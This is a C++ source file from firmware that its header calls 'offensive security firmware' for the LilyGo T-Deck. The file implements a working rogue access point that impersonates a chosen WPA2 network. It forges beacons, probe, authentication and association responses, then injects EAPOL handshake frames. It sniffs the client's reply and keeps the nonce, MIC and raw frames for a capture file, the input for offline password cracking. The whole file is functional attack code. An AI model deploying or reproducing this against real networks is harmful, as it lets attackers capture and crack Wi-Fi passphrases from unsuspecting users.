// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// rogue_handshake — manual rogue-AP WPA2 half-handshake engine. See header.

#include "rogue_handshake.h"
#include "dot11.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

namespace roguehs {

// ── session state ───────────────────────────────────────────────────────────
static State    s_st;
static bool     s_active = false;
static uint32_t s_lastBeacon = 0;

// M1 retransmit schedule — after a client associates we can't ACK, so we resend
// M1 several times, spaced out, to ride over the client settling into the
// associated state and over lost frames (until M2 arrives or the budget runs out).
#define RH_M1_RESENDS 10
#define RH_M1_GAP_MS  30
static uint8_t  s_m1Sta[6];
static int      s_m1Left = 0;
static uint32_t s_m1NextMs = 0;

// ── client-event ring (IRAM cb → main-loop poll) ────────────────────────────
// The promiscuous callback only records what it saw; all injection happens in
// poll() on the main task (injecting from the cb is timing-risky, and we can't
// meet SIFS for a real ACK anyway).
enum { RH_EV_PROBE = 1, RH_EV_AUTH = 2, RH_EV_ASSOC = 3 };
struct RhEvt { uint8_t type; uint8_t sta[6]; };
#define RH_EV_RING 16
static volatile RhEvt    s_ev[RH_EV_RING];
static volatile uint8_t  s_evHead = 0, s_evTail = 0;

// ── shared IE blobs ─────────────────────────────────────────────────────────
// Supported rates (1..54 Mbps) — element id 0x01.
static const uint8_t RH_RATES[] = { 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C };
// RSN IE (WPA2-PSK, CCMP) — element id 0x30. Tells the client this is WPA2-PSK.
static const uint8_t RH_RSN[] = {
    0x30, 0x14,
    0x01, 0x00,                   // version 1
    0x00, 0x0F, 0xAC, 0x04,       // group cipher CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,  // 1 pairwise cipher: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,  // 1 akm: PSK
    0x00, 0x00,                   // RSN capabilities
};

static inline void putHdr(uint8_t* p, uint8_t fc0, uint8_t fc1,
                          const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    p[0] = fc0; p[1] = fc1; p[2] = 0; p[3] = 0;
    memcpy(p + 4, da, 6); memcpy(p + 10, sa, 6); memcpy(p + 16, bssid, 6);
    uint16_t seq = (uint16_t)(esp_random() & 0xFFF);
    p[22] = (uint8_t)(seq << 4); p[23] = (uint8_t)(seq >> 4);
}

// Beacon / probe-resp share the fixed body (ts+interval+cap) + IEs. `da` differs.
// Returns frame length.
static uint16_t buildBeaconLike(uint8_t* pkt, uint8_t subtypeFc0, const uint8_t* da) {
    uint8_t* p = pkt;
    putHdr(p, subtypeFc0, 0x00, da, s_st.apMac, s_st.apMac);
    uint16_t o = 24;
    memset(p + o, 0, 8); o += 8;                 // timestamp
    p[o++] = 0x64; p[o++] = 0x00;                // beacon interval 100 TU
    p[o++] = 0x11; p[o++] = 0x04;                // capability: ESS + Privacy + short slot
    // SSID IE
    uint8_t sl = (uint8_t)strnlen(s_st.ssid, 32);
    p[o++] = 0x00; p[o++] = sl; memcpy(p + o, s_st.ssid, sl); o += sl;
    // Supported rates
    memcpy(p + o, RH_RATES, sizeof(RH_RATES)); o += sizeof(RH_RATES);
    // DS Parameter Set (current channel)
    p[o++] = 0x03; p[o++] = 0x01; p[o++] = s_st.channel;
    // RSN IE → advertises WPA2-PSK so the client starts the 4-way handshake
    memcpy(p + o, RH_RSN, sizeof(RH_RSN)); o += sizeof(RH_RSN);
    return o;
}

static uint16_t buildAuthResp(uint8_t* p, const uint8_t* sta) {
    putHdr(p, 0xB0, 0x00, sta, s_st.apMac, s_st.apMac);   // subtype 11 = auth
    uint16_t o = 24;
    p[o++] = 0x00; p[o++] = 0x00;     // auth algorithm: Open System
    p[o++] = 0x02; p[o++] = 0x00;     // auth transaction seq: 2
    p[o++] = 0x00; p[o++] = 0x00;     // status: success
    return o;
}

static uint16_t buildAssocResp(uint8_t* p, const uint8_t* sta) {
    putHdr(p, 0x10, 0x00, sta, s_st.apMac, s_st.apMac);   // subtype 1 = assoc resp
    uint16_t o = 24;
    p[o++] = 0x11; p[o++] = 0x04;     // capability
    p[o++] = 0x00; p[o++] = 0x00;     // status: success
    p[o++] = 0x01; p[o++] = 0xC0;     // AID 1 (top bits set)
    memcpy(p + o, RH_RATES, sizeof(RH_RATES)); o += sizeof(RH_RATES);
    return o;
}

// EAPOL-Key M1 (AP→STA): carries our ANonce. Key Info = version2 | pairwise | ACK.
static uint16_t buildM1(uint8_t* p, const uint8_t* sta) {
    putHdr(p, 0x08, 0x02, sta, s_st.apMac, s_st.apMac);   // data, FromDS
    uint16_t o = 24;
    // LLC/SNAP + EtherType EAPOL (0x888E)
    static const uint8_t llc[] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };
    memcpy(p + o, llc, 8); o += 8;
    uint8_t* e = p + o;               // EAPOL header start
    uint8_t* b = e + 4;               // EAPOL-Key body start
    // body: descriptor(1)+keyinfo(2)+keylen(2)+replay(8)+nonce(32)+iv(16)+rsc(8)
    //       +reserved(8)+mic(16)+datalen(2) = 95 bytes
    memset(b, 0, 95);
    b[0] = 0x02;                      // descriptor type: RSN
    b[1] = 0x00; b[2] = 0x8A;         // key info 0x008A: ver2 + pairwise + ACK
    b[3] = 0x00; b[4] = 0x10;         // key length 16 (CCMP)
    b[12] = 0x01;                     // replay counter = 1 (bytes 5..12)
    memcpy(b + 13, s_st.anonce, 32);  // key nonce = ANonce (body offset 13..44)
    // key data length (offset 93..94) already 0
    e[0] = 0x02; e[1] = 0x03;         // EAPOL version 2, type Key
    e[2] = 0x00; e[3] = 0x5F;         // EAPOL body length = 95
    o += 4 + 95;
    return o;
}

static inline void tx(const uint8_t* f, uint16_t len) {
    esp_wifi_80211_tx(WIFI_IF_STA, f, len, false);
}

// ── promiscuous callback — record client events + sniff M2 ───────────────────
static void IRAM_ATTR rxCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_active) return;
    const wifi_promiscuous_pkt_t* pp = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = pp->payload;
    uint16_t len = pp->rx_ctrl.sig_len;
    if (len < 24) return;

    uint8_t ft = dot11::fType(d), st = dot11::fSubtype(d);

    if (ft == 0) {  // management
        uint8_t type = 0;
        if (st == dot11::ST_PROBE_REQ) {
            char ss[33];
            uint8_t sl = dot11::extractSSID(d, len, dot11::ST_PROBE_REQ, ss, sizeof(ss));
            if (sl == 0 || strcmp(ss, s_st.ssid) != 0) return;   // only directed for our SSID
            s_st.probes++; type = RH_EV_PROBE;
        } else if (st == 11) {                                   // auth req
            if (memcmp(d + 4, s_st.apMac, 6) != 0) return;        // addr1 = our BSSID
            s_st.auths++; type = RH_EV_AUTH;
        } else if (st == dot11::ST_ASSOC_REQ || st == 2) {       // (re)assoc req
            if (memcmp(d + 4, s_st.apMac, 6) != 0) return;
            s_st.assocs++; type = RH_EV_ASSOC;
        } else {
            return;
        }
        uint8_t next = (s_evHead + 1) % RH_EV_RING;
        if (next == s_evTail) return;                            // ring full
        RhEvt& ev = (RhEvt&)s_ev[s_evHead];
        ev.type = type; memcpy(ev.sta, d + 10, 6);               // addr2 = STA
        s_evHead = next;
        return;
    }

    if (ft == 2 && !s_st.gotM2) {  // data — look for the client's M2
        dot11::Eapol ek;
        if (!dot11::parseEapol(d, len, ek)) return;
        if (!ek.fromSta || ek.msg != 2) return;                  // M2 = client→AP, msg 2
        if (memcmp(dot11::dataBssid(d), s_st.apMac, 6) != 0) return;
        if (ek.len < 97) return;
        s_st.m2Seen++;
        memcpy(s_st.staMac, d + 10, 6);                          // addr2 = STA
        memcpy(s_st.snonce, ek.p + 17, 32);
        memcpy(s_st.mic,    ek.p + 81, 16);
        uint16_t el = ((ek.p[2] << 8) | ek.p[3]) + 4;
        if (el > sizeof(s_st.eapol)) el = sizeof(s_st.eapol);
        if (el > ek.len)             el = ek.len;
        memcpy(s_st.eapol, ek.p, el);
        memset(s_st.eapol + 81, 0, 16);                          // zero MIC for HMAC
        s_st.eapolLen = el;
        uint16_t rl = len < sizeof(s_st.m2Raw) ? len : sizeof(s_st.m2Raw);
        memcpy(s_st.m2Raw, d, rl); s_st.m2RawLen = rl;           // full M2 frame for the .cap
        s_st.capTs = millis();
        s_st.gotM2 = true;
    }
}

// ── public API ───────────────────────────────────────────────────────────────
bool begin(const char* ssid, uint8_t channel) {
    memset(&s_st, 0, sizeof(s_st));
    strncpy(s_st.ssid, ssid, 32); s_st.ssid[32] = '\0';
    s_st.channel = (channel >= 1 && channel <= 13) ? channel : 1;
    for (int i = 0; i < 6; i++) s_st.apMac[i] = (uint8_t)esp_random();
    s_st.apMac[0] = (s_st.apMac[0] & 0xFE) | 0x02;               // LA-MAC, unicast
    for (int i = 0; i < 32; i++) s_st.anonce[i] = (uint8_t)esp_random();
    s_evHead = s_evTail = 0;
    s_m1Left = 0;

    WiFi.disconnect(false);
    WiFi.mode(WIFI_STA);
    // Set the STA interface MAC to our BSSID so the WiFi hardware ACKs the client's
    // auth/assoc/M2 frames at the MAC layer — without this the client gets no ACK
    // and most clients abandon before sending M2. esp_wifi_set_mac() needs the
    // interface stopped first, then started directly (mac_changer's proven path).
    esp_wifi_stop();
    esp_wifi_set_mac(WIFI_IF_STA, s_st.apMac);
    esp_wifi_start();

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    if (esp_wifi_set_promiscuous_filter(&filt) != ESP_OK) return false;
    if (esp_wifi_set_promiscuous(true) != ESP_OK) return false;
    esp_wifi_set_promiscuous_rx_cb(rxCb);
    esp_wifi_set_channel(s_st.channel, WIFI_SECOND_CHAN_NONE);

    s_active = true;
    s_lastBeacon = 0;
    return true;
}

void poll() {
    if (!s_active) return;
    uint8_t f[160];

    // Beacon ~every 100 ms so scanning clients discover the WPA2 network.
    uint32_t now = millis();
    if (now - s_lastBeacon >= 100) {
        uint8_t bcast[6]; memset(bcast, 0xFF, 6);
        uint16_t n = buildBeaconLike(f, 0x80, bcast);            // subtype 8 = beacon
        tx(f, n);
        if (!s_st.beaconLen && n <= sizeof(s_st.beacon)) {       // keep one for the .cap (ESSID)
            memcpy(s_st.beacon, f, n); s_st.beaconLen = n;
        }
        s_lastBeacon = now;
    }

    // Drain client events → inject the matching response(s). No ACKs are possible,
    // so we send each response a few times to ride over the client's retransmits.
    while (s_evTail != s_evHead) {
        RhEvt ev;
        memcpy(&ev, (const void*)&s_ev[s_evTail], sizeof(RhEvt));
        s_evTail = (s_evTail + 1) % RH_EV_RING;

        if (ev.type == RH_EV_PROBE) {
            uint16_t n = buildBeaconLike(f, 0x50, ev.sta);        // subtype 5 = probe resp
            tx(f, n); tx(f, n);
        } else if (ev.type == RH_EV_AUTH) {
            uint16_t n = buildAuthResp(f, ev.sta);
            tx(f, n); tx(f, n);
        } else if (ev.type == RH_EV_ASSOC) {
            uint16_t n = buildAssocResp(f, ev.sta);
            tx(f, n); tx(f, n);
            // The client now expects the 4-way handshake → schedule M1 retransmits
            // (first one goes out below this loop on the next scheduler tick).
            memcpy(s_m1Sta, ev.sta, 6);
            s_m1Left = RH_M1_RESENDS;
            s_m1NextMs = now;
        }
    }

    // Drive the M1 retransmit schedule (stops once the client's M2 is in).
    if (s_m1Left > 0 && !s_st.gotM2 && (int32_t)(now - s_m1NextMs) >= 0) {
        uint16_t m = buildM1(f, s_m1Sta);
        tx(f, m);
        if (m <= sizeof(s_st.m1Raw)) {                           // keep the exact M1 for the .cap
            memcpy(s_st.m1Raw, f, m); s_st.m1RawLen = m;
        }
        s_st.m1Sent++;
        s_m1Left--;
        s_m1NextMs = now + RH_M1_GAP_MS;
    }
}

const State& state() { return s_st; }

void end() {
    s_active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_STA);
}

}  // namespace roguehs
